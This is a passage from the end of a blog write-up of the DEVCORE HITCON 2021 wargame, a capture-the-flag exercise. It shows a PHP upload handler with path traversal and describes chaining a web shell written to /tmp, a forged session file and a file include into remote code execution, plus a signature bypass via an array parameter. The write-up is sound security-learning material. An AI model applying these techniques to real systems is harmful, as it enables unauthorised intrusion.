    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/json; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.'</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'folder'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'folder'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">IMAGE_PATH</span><span class="token operator">.</span><span class="token variable">$folder</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">IMAGE_PATH</span><span class="token operator">.</span><span class="token variable">$folder</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$folder</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token constant">IMAGE_PATH</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rsync_wrap "</span><span class="token operator">.</span><span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">base64_urlsafe_encode</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
        <span class="token string single-quoted-string">'default'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'/image.php?id='</span><span class="token operator">.</span><span class="token variable">$id</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>First, try to upload it to <code>../../../../../usr/share/nginx/frontend</code> and see, and then I got the fifth flag:</p>
<p><img src="/img/devcore-wargame/p3.png"></p>
<p>But when I tried it, I found that the file was not actually written, and I tried other paths, such as <code>b8ck3nd</code>, or I thought it might be written to <code>/usr/share/nginx/frontend/third_party/vendor</code> and then triggered the phar vulnerability mentioned earlier (which seems reasonable), but it couldn’t be written here either.</p>
<p>Or write it into <code>langs</code> and switch languages to import files, but it couldn’t be written here either.</p>
<p>After thinking for a while, I tried writing it to <code>/tmp</code>, which worked fine, so the answer was obvious. First, write a file <code>/tmp/test1234.php</code>, and then write <code>/tmp/sess_abc</code>. Because the session file content can be manipulated, you can fill in the desired lang and manipulate the value of <code>$_SESSION[&#39;lang&#39;]</code>, and then use the <code>include.php</code> mentioned at the beginning to import the web shell you wrote, and you can get RCE.</p>
<p>After RCE, you can execute <code>/readflag</code> in the root directory to read the flag.</p>
<p>So I missed the second flag alone, and I completed all the others, but where is the last one? After getting the shell, I went inside and looked around a bit. I originally thought it might be in the nginx config, but I couldn’t find it no matter how I looked (even at the end, I didn’t find where the nginx config was).</p>
<p>After about half an hour, the order of the appearance of the flags should be similar to the order of the difficulty of the solutions. Since the first flag is Path Traversal and the third flag is SQL injection, the second flag should appear between the two. So I suddenly had an idea and thought, “It can’t be…”</p>
<p>Then go to <a target="_blank" rel="noopener" href="http://web.ctf.devcore.tw/order.php?id=1&sig%5B%5D=1">http://web.ctf.devcore.tw/order.php?id=1&amp;sig[]=1</a></p>
<p>The second flag appeared in front of me like this:</p>
<p><img src="/img/devcore-wargame/p4.png"></p>
<h2><span id="summary">Summary</span></h2><p>Finally, let’s review the problems encountered this time.</p>
<p>The most serious problem is that the critical file was not found when reading the file, which caused the whole thing to get stuck later.</p>
<p>In the future, when encountering vulnerabilities that can read local files, you should create a dictionary file yourself. Otherwise, you will have to google for a long time to find out which files can be read each time. I will write an article to summarize this later.</p>
<p>The second issue is that I didn’t notice the second flag. Actually, when doing SQL injection, if all the data that should be obtained has been obtained, it should be visible. Therefore, in the future, remember to dump the entire database.</p>
<p>Overall, I think it’s quite fun. Thanks to DEVCORE’s wargame, and finally, because the challenge time was extended a bit, I successfully obtained the challenger NFT issued by DEVCORE!</p>
<p><img src="/img/devcore-wargame/p5.png"></p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2021/12/15/en/crest-cpsa-prepare/">CPSA (CREST Practitioner Security Analyst) Exam Experience</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2021/11/14/en/intigriti-xss-1021/">Learning HTML Again from Intigriti&#39;s October XSS Challenge</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2021/12/01/hitcon2021-devcore-wargame-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>